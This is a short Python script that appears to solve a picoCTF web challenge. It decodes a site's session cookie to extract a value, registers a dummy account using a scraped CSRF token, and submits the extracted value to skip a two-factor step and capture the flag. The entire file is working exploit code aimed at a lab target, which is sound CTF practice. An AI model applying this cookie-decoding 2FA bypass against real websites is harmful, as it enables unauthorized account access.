import sys
import requests
import re
from bs4 import BeautifulSoup
import base64
import json
import time
## proxies for checking if error
proxies = {
    "http": "http://127.0.0.1:8080",
    "https": "http://127.0.0.1:8080"
}

def main():
    if len(sys.argv) != 2:
        print("(-) input url")
        sys.exit(-1)

    url = sys.argv[1]

    s = requests.Session()

    r = s.get(
        url,
        verify=False,
    )
    if r.status_code == 200:
        time.sleep(2)
        print('(+) successfully accessed the website')
        time.sleep(2)
        print('(+) getting session')
        session = s.cookies.get("session")
        payload = session.split(".")[0]
        time.sleep(2)
        print("(+) decode session into utf-8")
        decode = base64.b64decode(payload).decode("utf-8")
        cookie = json.loads(decode)
        kunci = next(iter(cookie.values()))
        time.sleep(2)
        print("(+) get key for bypass = " + kunci)

        soup = BeautifulSoup(r.text, "html.parser")

        csrf = soup.find("input", {"name": "csrf_token"})["value"]
        data = {
            "csrf_token": csrf,
            "full_name": "123",
            "username": "123",
            "phone_number": "123",
            "city": "123",
            "password": "123",
            "submit": "Register"
        }

        r = s.post(
            url,
            data=data,
            verify=False,
        )

        if r.status_code == 200:
            time.sleep(2)
            print('(+) succesfull register the web')
            time.sleep(2)
            print("(+) bypassing 2fa with key")
            dasboard = url + 'dashboard'
            cookie = {"csrf_token":kunci}
            r = s.post(dasboard, data=cookie, verify=False)
            if r.status_code == 200:
                print("(+) successfully bypassed")
                flag = re.search(r'picoCTF\{[^}]+\}', r.text)
                time.sleep(2)
                print("(+) this is you flag " + flag.group(0))



if __name__ == "__main__":
    main()